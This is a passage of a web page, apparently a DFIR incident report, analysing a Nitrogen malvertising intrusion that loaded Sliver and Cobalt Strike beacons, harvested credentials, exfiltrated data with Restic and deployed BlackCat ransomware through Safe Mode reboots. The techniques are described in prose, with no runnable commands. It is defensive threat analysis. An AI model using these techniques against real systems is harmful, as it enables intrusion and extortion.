		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>								</nav><!-- #site-navigation -->
            			</div>
        				</div><!-- .wrap -->
     				</div><!-- .navigation-top -->
				<div class="clock"> 
					<div id="time"></div>
					<div id="date">Friday, October 25, 2024</div>
				</div>
				</div><!-- #nav-sticker -->
				       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			</div><!-- .main-header-brand -->
						
							</div><!-- .main-header -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
		<div class="site-content-cell">
						<div class="wrap wrap-width">

	<div id="primary" class="content-area">
		<main id="main" class="site-main">

		
<article id="post-38756" class="post-38756 post type-post status-publish format-standard hentry category-blackcat category-cobaltstrike category-ransomware category-sliver entry">
	
	<div class="entry-content-holder">
		<header class="entry-header">

		
				<div class="entry-meta">

					
		<span class="cat-links">
		
			<a class="category-color-134" href="https://thedfirreport.com/category/blackcat/">blackcat</a>
		
			<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
		
			<a class="category-color-2" href="https://thedfirreport.com/category/ransomware/">ransomware</a>
		
			<a class="category-color-126" href="https://thedfirreport.com/category/sliver/">sliver</a>
				</span>
	
				</div><!-- .entry-meta -->
			<h1 class="entry-title">Nitrogen Campaign Drops Sliver and Ends With BlackCat Ransomware</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/" rel="bookmark"><time class="entry-date published" datetime="2024-09-30T00:45:53+00:00">September 30, 2024</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		
<h2 id="key" class="wp-block-heading"><a href="#key">Key Takeaways</a></h2>



<ul class="wp-block-list">
<li>In November 2023, we identified a BlackCat ransomware intrusion started by Nitrogen malware hosted on a website impersonating Advanced IP Scanner.</li>



<li>Nitrogen was leveraged to deploy Sliver and Cobalt Strike beacons on the beachhead host and perform further malicious actions. The two post-exploitation frameworks were loaded in memory through Python scripts.</li>



<li>After obtaining initial access and establishing further command and control connections, the threat actor enumerated the compromised network with the use of PowerSploit, SharpHound, and native Windows utilities. Impacket was employed to move laterally, after harvesting domain credentials.</li>



<li>The threat actor deployed an opensource backup tool call Restic on a file server to exfiltrate share data to a remote server.</li>



<li>Eight days after initial access the threat actor modified a privileged user password and deployed BlackCat ransomware across the domain using PsExec to execute a batch script.</li>
<li>Six rules were added to our Private Ruleset related to this intrusion.</li>
</ul>
<p>An audio version of this report can be found on <a href="https://podcasters.spotify.com/pod/show/the-dfir-report/" target="_blank" rel="noreferrer noopener">Spotify</a>, <a href="https://podcasts.apple.com/us/podcast/reports/id1728699064" target="_blank" rel="noreferrer noopener">Apple</a>, <a href="https://www.youtube.com/@TheDFIRReport/videos" target="_blank" rel="noreferrer noopener">YouTube</a>, <a href="https://www.audible.com/pd/Reports-Podcast/B0CSZBRCFX?action_code=ASSGB149080119000H&amp;share_location=pdp" target="_blank" rel="noreferrer noopener">Audible</a>, &amp; <a href="https://music.amazon.com/podcasts/c4fe897d-a4b4-4ceb-908d-d1a78af8cb6d/reports" target="_blank" rel="noreferrer noopener">Amazon</a>. </p>
<h2 id="services" class="wp-block-heading"><a href="#services">The DFIR Report Services</a></h2>
<p>

</p>
<p>

</p>
<ul class="wp-block-list">
<li><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noreferrer noopener">Private Threat Briefs</a>: Over 20 private DFIR reports annually.</li>



<li><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noreferrer noopener">Threat Feed</a>: Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>



<li><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noreferrer noopener">All Intel</a>: Includes everything from Private Threat Briefs and Threat Feed, plus private events, opendir reports, long-term tracking, data clustering, and other curated intel.</li>



<li><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noreferrer noopener">Private Sigma Ruleset</a>: Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>



<li><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>: Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>
<p>

</p>
<p><a href="https://thedfirreport.com/contact/" target="_blank" rel="noreferrer noopener">Contact us</a> today for pricing or a demo!</p>

<h4>Table of Contents:</h4>
<ul>
<li><a href="#case-summary">Case Summary</a></li>
<li><a href="#analysts">Analysts</a></li>
<li><a href="#initial-access">Initial Access</a></li>
<li><a href="#execution">Execution</a></li>
<li><a href="#persistence">Persistence</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
<li><a href="#defense-evasion">Defense Evasion</a></li>
<li><a href="#credential-access">Credential Access</a></li>
<li><a href="#discovery">Discovery</a></li>
<li><a href="#lateral-movement">Lateral Movement</a></li>
<li><a href="#collection">Collection</a></li>
<li><a href="#command-and-control">Command and Control</a></li>
<li><a href="#exfiltration">Exfiltration</a></li>
<li><a href="#impact">Impact</a></li>
<li><a href="#timeline">Timeline</a></li>
<li><a href="#diamond-model">Diamond Model</a></li>
<li><a href="#indicators">Indicators</a></li>
<li><a href="#detections">Detections</a></li>
<li><a href="#mitre">MITRE ATT&amp;CK</a></li>
</ul>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The incident began when a user unknowingly downloaded a malicious version of Advanced IP Scanner from a fraudulent website that mimicked the legitimate one, leveraging Google ads to rank higher in search results. Analysis of the attack pattern and loader signature suggests this was part of a Nitrogen campaign, consistent with previous public reports. The compromised installer came as a ZIP file, which the victim extracted before launching the embedded executable, triggering the infection.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The executable was a legitimate Python binary, which side-loaded a modified Python DLL specifically designed to execute Nitrogen code. This process then dropped a Sliver beacon in an AppData subfolder named &#8220;Notepad.&#8221; All malware deployed during the intrusion was obfuscated using Py-Fuscate to conceal malicious Python scripts. About eight minutes after the Nitrogen execution, the attacker initiated hands-on keyboard discovery, utilizing Windows utilities such as <em>net</em>, <em>ipconfig</em>, and <em>nltest</em>. Two minutes later, additional Sliver beacons were deployed on the compromised host, with persistence established through scheduled tasks and registry key modifications.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A little over an hour after the initial execution, the threat actor deployed additional malware, this time Cobalt Strike beacons, again wrapped in the Py-Fuscate obfuscation technique. The discovery phase continued with detailed enumeration of the Active Directory domain, including local and domain administrators, domain controllers, and computers. To deepen their understanding of the environment, the attacker utilized tools such as SharpHound and PowerSploit. The Cobalt Strike beacon was then used to dump domain credentials from LSASS, granting the attacker local admin credentials with broad access across the network.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Using the stolen credentials, the threat actor leveraged Impacket&#8217;s <em>wmiexec</em> to move laterally to a server, where they used <em>curl</em> to download a ZIP file containing their tools. After extracting the archive, they repeated the same persistence techniques observed on the beachhead, creating scheduled tasks and modifying registry keys. The attacker then targeted a second server, replicating the same steps to deploy their tools and maintain persistence. Shortly after, a second credential dump was performed, again targeting LSASS memory. Following this, the threat actor began using a domain administrator account, indicating they likely obtained those credentials during this phase.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actor continued their lateral movement, replicating the same actions on both a file server and a backup server. Approximately six hours after gaining initial access, they deployed the open-source backup tool <em>Restic</em> on the file server. Using <em>Restic</em>, the attacker exfiltrated data from the file shares to a remote server located in Bulgaria. After this, the hands-on activity significantly decreased and remained largely silent until the seventh day.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the seventh day, the threat actor logged into the backup server and accessed the backup console. No further actions were observed, leading us to assess that this was likely a discovery effort aimed at understanding the backup configurations.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the eighth day, the threat actor shifted to their final objectives. They identified the domain controllers and used <em>xcopy</em> from their initial lateral movement server to transfer tools to one of the domain controllers, executing them remotely via <em>WMIC</em>. Next, they ran a batch script on the domain controller using <em>PSEXEC</em>, targeting a privileged backup service account, which changed that accounts credentials. From the staging server, the attacker began distributing the BlackCat ransomware binary across the network using <em>SMB</em> and the Windows copy utility. This was followed by executing another batch script via <em>PSEXEC</em> on multiple remote hosts, initiating the ransomware deployment.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The final script executed a series of actions on remote hosts, including configuring them to start in Safe Mode with Networking and setting a registry run key to launch the ransomware binary upon reboot. It also set the compromised backup service account to auto login using Winlogon, and then forced a system reboot. As a result, the hosts rebooted into Safe Mode, where the ransomware was automatically executed. This led to file encryption across the affected systems, with the ransomware leaving a note on each host. The Time to Ransomware (TTR) was approximately 156 hours, spanning over eight calendar days.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>If you would like to get an email when we publish a new report, please subscribe <a href="https://thedfirreport.com/subscribe/" target="_blank" rel="noreferrer noopener">here</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:heading --><!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="analysts" class="wp-block-heading"><a href="#analysts">Analysts</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Analysis and reporting completed by <a href="https://www.linkedin.com/in/angelo-violetti/" target="_blank" rel="noreferrer noopener">Angelo Violetti</a>, <a href="https://twitter.com/0xtornado" target="_blank" rel="noreferrer noopener">@0xtornado</a> (<a href="http://linkedin.com/in/jbariomar">Linkedin</a>) and</p>
<div class="css-175oi2r r-1wbh5a2 r-dnmrzs r-1ny4l3l" tabindex="-1">
<div class="css-175oi2r">
<div class="css-146c3p1 r-dnmrzs r-1udh08x r-3s2u2q r-bcqeeo r-1ttztb7 r-qvutc0 r-37j5jr r-a023e6 r-rjixqe r-16dba41 r-18u37iz r-1wvb978" dir="ltr"><a href="https://x.com/v3t0_" target="_blank" rel="noopener"><span class="css-1jxf684 r-bcqeeo r-1ttztb7 r-qvutc0 r-poiln3">@v3t0_.</span></a></div>
</div>
</div>
<p>.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Drive-by Compromise</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Based on threat intelligence sources and the file name, we are highly confident that the threat actors accessed the victim&#8217;s infrastructure through a Nitrogen campaign, which delivered a ZIP file via malicious Google ads (i.e., malvertising).</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Nitrogen is known for leveraging legitimate utilities like Advanced IP Scanner, Putty, etc. to conceal malware. The following graph shows the Nitrogen infection chain and how it executed Sliver.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_001.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-38826" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_001.png" alt="" width="2136" height="1605" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_001.png 2136w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_001-300x225.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_001-1024x769.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_001-768x577.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_001-1536x1154.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_001-2048x1539.png 2048w" sizes="(max-width: 2136px) 100vw, 2136px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The ZIP file named Version.zip contained mainly:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>a legitimate Python executable named setup.exe which was run by the victim.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>two hidden Python DLLs.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_002.png"><img decoding="async" class="aligncenter size-full wp-image-38825" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_002.png" alt="" width="1418" height="487" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_002.png 1418w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_002-300x103.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_002-1024x352.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_002-768x264.png 768w" sizes="(max-width: 1418px) 100vw, 1418px" /></a></p>
<p>Upon execution of Setup.exe, the following actions were performed:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The hidden python311.dll was loaded (DLL sideloading) and the Nitrogen code was launched.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A legitimate copy of Advanced IP Scanner was copied into the %Public%\Downloads folder.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>python.exe, pycryptodome, and a Sliver beacon were placed into a folder named %AppData%\Notepad.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The Sliver beacon was executed through a Python script named slv.py which decrypts an AES-encrypted DLL (data.aes) and loads it into memory.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Advanced IP Scanner was installed in the compromised system.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>A very similar campaign was reported by @dipotwb on <a href="https://x.com/dipotwb/status/1729472226418671853" target="_blank" rel="noreferrer noopener">Twitter</a>. We also observed overlap with campaigns reported by <a href="https://www.esentire.com/blog/nitrogen-campaign-2-0-reloads-with-enhanced-capabilities-leading-to-alphv-blackcat-ransomware" target="_blank" rel="noreferrer noopener">Esentire</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_003.png"><img decoding="async" class="aligncenter size-full wp-image-38824" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_003.png" alt="" width="748" height="903" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_003.png 748w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_003-249x300.png 249w" sizes="(max-width: 748px) 100vw, 748px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>A few minutes later, the threat actor deployed Python scripts on the beachhead, serving as loaders for both Sliver and Cobalt Strike.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38823" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_004.png" alt="" width="1793" height="207" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_004.png 1793w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_004-300x35.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_004-1024x118.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_004-768x89.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_004-1536x177.png 1536w" sizes="(max-width: 1793px) 100vw, 1793px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The following image shows the sequence of beacons executed on the beachhead host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38822" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_005.png" alt="" width="2342" height="787" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_005.png 2342w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_005-300x101.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_005-1024x344.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_005-768x258.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_005-1536x516.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_005-2048x688.png 2048w" sizes="(max-width: 2342px) 100vw, 2342px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Sliver</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The Python script, slv.py, used to load Sliver into memory, was heavily obfuscated. However, buried within thousands of lines of code was the critical section responsible for executing the Sliver beacon.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38821" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_006.png" alt="" width="1190" height="745" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_006.png 1190w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_006-300x188.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_006-1024x641.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_006-768x481.png 768w" sizes="(max-width: 1190px) 100vw, 1190px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Based on the analysis of these artifacts, it appears the Sliver payload was likely obfuscated using <a href="https://github.com/Sl-Sanda-Ru/Py-Fuscate" target="_blank" rel="noreferrer noopener">Py-Fuscate</a>, as the tool&#8217;s encode function mirrored the same imports and procedures found in the obfuscated script, effectively concealing the malicious code.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38820" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_007.png" alt="" width="872" height="232" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_007.png 872w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_007-300x80.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_007-768x204.png 768w" sizes="(max-width: 872px) 100vw, 872px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The Sliver execution revealed multiple interesting debugging strings. In the first instance, Windows API functions&#8217; addresses are resolved.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38819" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_008.png" alt="" width="713" height="463" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_008.png 713w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_008-300x195.png 300w" sizes="(max-width: 713px) 100vw, 713px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Subsequently, the Sliver DLL is injected in memory and the DLL entrypoint is called.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38818" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_009.png" alt="" width="758" height="825" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_009.png 758w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_009-276x300.png 276w" sizes="(max-width: 758px) 100vw, 758px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Those debugging strings are the same ones used by <a href="https://github.com/naksyn/Pyramid" target="_blank" rel="noreferrer noopener">Pyramid</a> in the <a href="https://github.com/naksyn/Pyramid/blob/main/Server/Dependencies/pythonmemorymodule/pythonmemorymodule.zip" target="_blank" rel="noreferrer noopener">pythonmemorymodule</a> which is a module used to inject and execute DLLs in memory.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38817" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_010.png" alt="" width="1152" height="479" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_010.png 1152w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_010-300x125.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_010-1024x426.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_010-768x319.png 768w" sizes="(max-width: 1152px) 100vw, 1152px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38816" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_011.png" alt="" width="1148" height="809" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_011.png 1148w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_011-300x211.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_011-1024x722.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_011-768x541.png 768w" sizes="(max-width: 1148px) 100vw, 1148px" /></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>By analyzing the Python.exe process memory, it was possible to notice the DLL injected in the memory sections previously described in the debugging strings.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38815" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_012.png" alt="" width="937" height="247" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_012.png 937w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_012-300x79.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_012-768x202.png 768w" sizes="(max-width: 937px) 100vw, 937px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38814" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_013.png" alt="" width="686" height="287" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_013.png 686w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_013-300x126.png 300w" sizes="(max-width: 686px) 100vw, 686px" /></a></p>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The Sliver DLL exports multiple functions, however, StartW is the one to run the beacon.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38813" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_014.png" alt="" width="858" height="289" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_014.png 858w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_014-300x101.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_014-768x259.png 768w" sizes="(max-width: 858px) 100vw, 858px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Multiple strings related to Sliver were found in the process memory.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38812" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_015.png" alt="" width="907" height="740" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_015.png 907w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_015-300x245.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_015-768x627.png 768w" sizes="(max-width: 907px) 100vw, 907px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Cobalt Strike</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>wo14.py is another highly obfuscated Python script that acts as a loader for custom shellcode. In this specific case, the threat actor specified an AES-encrypted Cobalt Strike shellcode which is:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Decrypted through the key &#8220;we3p2v5t85&#8221;.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Copied into a newly allocated memory region in the Heap.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Executed by invoking the function CreateThread.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38811" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_016.png" alt="" width="1474" height="1125" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_016.png 1474w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_016-300x229.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_016-1024x782.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_016-768x586.png 768w" sizes="(max-width: 1474px) 100vw, 1474px" /></a></p>
<p>wo12.py has the same behavior.</p>
